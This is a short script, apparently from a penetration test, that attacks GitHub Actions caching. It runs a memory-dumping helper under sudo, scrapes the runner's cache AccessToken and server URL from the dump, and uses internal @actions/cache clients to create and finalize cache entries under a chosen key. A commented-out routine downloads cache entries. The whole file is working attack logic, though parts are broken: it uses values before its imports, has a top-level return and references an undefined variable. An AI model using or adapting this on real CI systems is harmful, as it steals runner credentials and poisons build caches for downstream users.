const path = process.argv[2];
const key = process.argv[3];
const version = crypto.randomBytes(32).toString('hex');


/////////////////////////////////////////
import * as cache from "@actions/cache";
const { execSync } = require("child_process");
import * as fs from 'fs';
import * as crypto from 'crypto';
import { FinalizeCacheEntryUploadRequest, FinalizeCacheEntryUploadResponse, CreateCacheEntryRequest, GetCacheEntryDownloadURLRequest } from '@actions/cache/lib/generated/results/api/v1/cache';
import { UploadOptions, DownloadOptions } from '@actions/cache/lib/options';
const cacheTwirpClient = require('@actions/cache/lib/internal/shared/cacheTwirpClient');
const cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');

const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
const url = memtext.match(/CacheServerUrl"\s*:\s*"([^"]+)"/)?.[1];
const token = memtext.match(/AccessToken"\s*:\s*"([^"]+)"/)?.[1];

process.env.ACTIONS_RUNTIME_TOKEN = token;
process.env.ACTIONS_RESULTS_URL = url;

try {
    const stats = fs.statSync(path);
    const archiveFileSize = stats.size;
    const request: CreateCacheEntryRequest = { key, version };
    const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
    const response = await twirpClient.CreateCacheEntry(request);
    const options: UploadOptions = { useAzureSdk: true };
    if (response.ok) {
        await cacheHttpClient.saveCache(-1, archive, response.signedUploadUrl, options);
        console.log('Cache entry created successfully:', response);
        const finalizeRequest: FinalizeCacheEntryUploadRequest = { key, version, sizeBytes: `${archiveFileSize}` };
        const finalizeResponse: FinalizeCacheEntryUploadResponse = await twirpClient.FinalizeCacheEntryUpload(finalizeRequest);
        if (finalizeResponse.ok) {
            console.log('Cache entry finalized successfully!');
            return true;
        } else {
            console.error('Error finalizing cache entry');
            return false;
        }
    } else {
        console.log('Error saving cache entry:', response.status, response.statusText);
        return false;
    }
} catch (error) {
    console.error('Error setting cache entry:', error);
    return false;
}





/*
class CacheService {
    async restoreEntry(cache_key, cache_version) {
        try {
            const request: GetCacheEntryDownloadURLRequest = {
                key: cache_key,
                restoreKeys: [],
                version: cache_version
            }
            const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
            const response = await twirpClient.GetCacheEntryDownloadURL(request)
            const options: DownloadOptions = {useAzureSdk: true}
            if (response.ok) {
                // Generate unique path for each download to avoid conflicts
                const uniqueId = crypto.randomBytes(8).toString('hex');
                const downloadPath = `/tmp/pentest-${uniqueId}.tar.tzstd`;
                
                await cacheHttpClient.downloadCache(response.signedDownloadUrl, downloadPath, options);
                if (fs.existsSync(downloadPath)) {
                    console.log('Cache retrieved successfully');
                    return downloadPath;
                } else {
                    console.error('Failed to download cache');
                    return '';
                }
            } else if (response.status == 204) {
                console.log('Cache not found!');
            } else {
                console.error(`Failed to retrieve cache: ${response.status}`);
            }
        } catch (error) {
            console.error(`Failed to retrieve cache: ${error}`);
        }
        return '';
    }
}
*/

